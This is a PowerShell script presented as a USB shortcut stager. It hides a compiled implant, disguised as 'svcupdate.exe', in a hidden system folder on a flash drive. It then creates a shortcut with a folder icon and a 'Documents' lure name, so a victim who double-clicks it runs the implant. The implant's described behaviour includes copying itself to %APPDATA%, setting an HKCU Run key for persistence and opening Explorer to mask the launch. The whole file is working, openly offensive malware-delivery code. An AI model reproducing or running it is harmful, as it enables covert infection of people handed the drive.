<#
.SYNOPSIS
    USB .lnk stager: drops the implant on a flash drive behind a folder-icon lure.
.DESCRIPTION
    Run on the OPERATOR machine with the target USB mounted.
    - Copies the implant .exe into a hidden folder on the USB (Hidden+System).
    - Creates a .lnk at the USB root with a folder icon; double-clicking it
      runs the payload. The implant then self-copies to %APPDATA%,
      sets an HKCU Run key, opens Explorer at the drive root (so the "folder"
      looks like it opened) and exits the USB copy.
    Note: same-volume relative resolution keeps the .lnk working when the
    drive letter changes between machines.
.PARAMETER UsbPath
    Mounted USB root, e.g. 'E:\'
.PARAMETER Payload
    Path to the compiled implant, e.g. '.\target\x86_64-pc-windows-gnu\release\implant.exe'
.PARAMETER LureName
    Visible name of the shortcut (default 'Sənədlər').
#>
param(
    [Parameter(Mandatory = $true)][string]$UsbPath,
    [Parameter(Mandatory = $true)][string]$Payload,
    [string]$LureName = "Sənədlər",
    [string]$PayloadName = "svcupdate.exe"
)

$ErrorActionPreference = "Stop"

if (-not (Test-Path $UsbPath)) { throw "USB path not found: $UsbPath" }
if (-not (Test-Path $Payload))  { throw "Payload not found: $Payload" }

$usb = (Resolve-Path $UsbPath).Path.TrimEnd('\')
$vault = Join-Path $usb "_sys"
New-Item -ItemType Directory -Force -Path $vault | Out-Null

# 1. Drop payload (hidden + system)
$dst = Join-Path $vault $PayloadName
Copy-Item $Payload $dst -Force
attrib +h +s $dst | Out-Null
attrib +h $vault | Out-Null
Write-Host "[+] payload -> $dst"

# 2. Build the lure shortcut with a folder icon, minimized window
$lnkPath = Join-Path $usb ("$LureName.lnk")
$shell = New-Object -ComObject WScript.Shell
$lnk = $shell.CreateShortcut($lnkPath)
$lnk.TargetPath = $dst
$lnk.WorkingDirectory = $vault
$lnk.WindowStyle = 7            # minimized: no flash, no console
$lnk.IconLocation = "$env:SystemRoot\System32\shell32.dll,3"  # closed-folder icon
$lnk.Description = $LureName
$lnk.Save()
Write-Host "[+] lure    -> $lnkPath (folder icon, minimized)"
Write-Host ""
Write-Host "Done. Hand over the USB: when the lure is double-clicked the"
Write-Host "implant installs itself and opens Explorer at the drive root,"
Write-Host "so the click looks like an ordinary folder open."
